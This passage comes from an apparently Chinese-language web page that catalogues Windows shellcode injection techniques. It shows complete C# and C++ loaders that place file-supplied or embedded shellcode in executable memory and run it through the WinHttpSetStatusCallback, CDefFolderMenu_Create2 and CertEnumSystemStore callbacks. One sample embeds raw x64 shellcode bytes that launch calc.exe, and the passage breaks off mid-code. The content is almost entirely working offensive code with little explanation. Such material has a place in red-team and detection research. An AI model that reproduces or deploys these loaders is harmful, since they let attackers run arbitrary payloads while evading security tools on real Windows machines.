class="hljs-string">"Example&nbsp;Usage:&nbsp;WinHttpSetStatusCallback.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;WINHTTP_ACCESS_TYPE_DEFAULT_PROXY&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;WINHTTP_NO_PROXY_NAME&nbsp;=&nbsp;<span class="hljs-literal">null</span>;<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;WINHTTP_NO_PROXY_BYPASS&nbsp;=&nbsp;<span class="hljs-literal">null</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hSession&nbsp;=&nbsp;WinHttpOpen(<span class="hljs-literal">null</span>,&nbsp;WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,&nbsp;WINHTTP_NO_PROXY_NAME,&nbsp;WINHTTP_NO_PROXY_BYPASS,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS&nbsp;=&nbsp;<span class="hljs-number">0xFFFFFFFF</span>;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WinHttpSetStatusCallback(hSession,&nbsp;hAlloc,&nbsp;WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,&nbsp;IntPtr.Zero);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WinHttpConnect(hSession,&nbsp;<span class="hljs-string">"localhost"</span>,&nbsp;<span class="hljs-number">80</span>,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">57</span><br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Winhttp.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">WinHttpOpen</span>(<span class="hljs-params"><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;pszAgent,<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwAccessType,<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;pszProxyW,<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;pszProxyBypass,<br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwFlags</span>)</span>;<br><span class="linenum hljs-number">73</span><br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Winhttp.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">WinHttpSetStatusCallback</span>(<span class="hljs-params"><br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hInternet,<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpfnInternetCallback,<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwNotificationFlags,<br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;dwReserved</span>)</span>;<br><span class="linenum hljs-number">80</span><br><span class="linenum hljs-number">81</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"winhttp.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">82</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">WinHttpConnect</span>(<span class="hljs-params">IntPtr&nbsp;hSession,<br><span class="linenum hljs-number">83</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;pswzServerName,<br><span class="linenum hljs-number">84</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">short</span>&nbsp;nServerPort,<br><span class="linenum hljs-number">85</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwReserved</span>)</span>;<br><span class="linenum hljs-number">86</span><br><span class="linenum hljs-number">87</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">88</span>}<br></code></pre>
<h1 id="h18cdeffoldermenu_create2"><span>18.回调函数注入 通过 CDefFolderMenu_Create2</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Shell32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;shlobj_core.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;CDefFolderMenu_Create2.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ICM&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;CDefFolderMenu_Create2(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(LPFNDFMCALLBACK)hAlloc,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;&amp;ICM);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>CLEANUP:<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">42</span>}<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">45</span></span>{<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">57</span><br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">59</span>}<br></code></pre>
<h1 id="h19certenumsystemstore"><span>19.回调函数注入 通过 CertEnumSystemStore</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;Requires&nbsp;Crypt32.lib</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span 